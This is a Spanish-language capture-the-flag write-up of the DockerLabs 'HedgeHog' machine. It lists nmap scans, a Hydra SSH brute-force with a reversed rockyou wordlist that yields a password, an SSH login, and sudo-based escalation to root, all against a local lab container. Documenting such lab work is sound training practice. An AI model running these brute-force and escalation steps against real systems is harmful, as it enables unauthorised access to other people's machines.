# 🎯 HedgeHog - DockerLabs

## 🔍 Fase 1: Enumeración

### Escaneo de puertos
`sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2`
![[Nmap7.png]]
### Escaneo de versiones
`sudo nmap -sCV -p22,80 172.17.0.2`
![[Nmap7.2.png]]

---

## 🌐 Fase 2: Reconocimiento web

`curl http://172.17.0.2`
![[Curl7.png]]

**Usuario identificado:** `tails`

---

## 🔑 Fase 3: Fuerza bruta SSH (optimizada)

### Preparar diccionario invertido
`tac /home/moon/Documents/WorldList/rockyou.txt > rockyou_reversed.txt`
![[Tac7.png]]
### Eliminar espacios en blanco
`cat rockyou_reversed.txt | sed 's/ //g' > temp.txt && mv temp.txt rockyou_reversed.txt`
![[Cat7.png]]
### Lanzar Hydra
`hydra -l tails -P rockyou_reversed.txt ssh://172.17.0.2 -t 64`
![[Hydra7.png]]
**Resultado:**
`[22][ssh] host: 172.17.0.2 login: tails password: 3117548331`

---

## 🚪 Fase 4: Acceso SSH

`ssh tails@172.17.0.2`
Contraseña: `3117548331`
![[Ssh7.png]]

---

## ⚡ Fase 5: Escalada de privilegios

### De tails a sonic
`sudo -u sonic /bin/bash`
![[Sudo7.png]]
### De sonic a root
`sudo -u root /bin/bash`
![[Sudo7.2.png]]
### Verificar
`whoami`
`root`

---
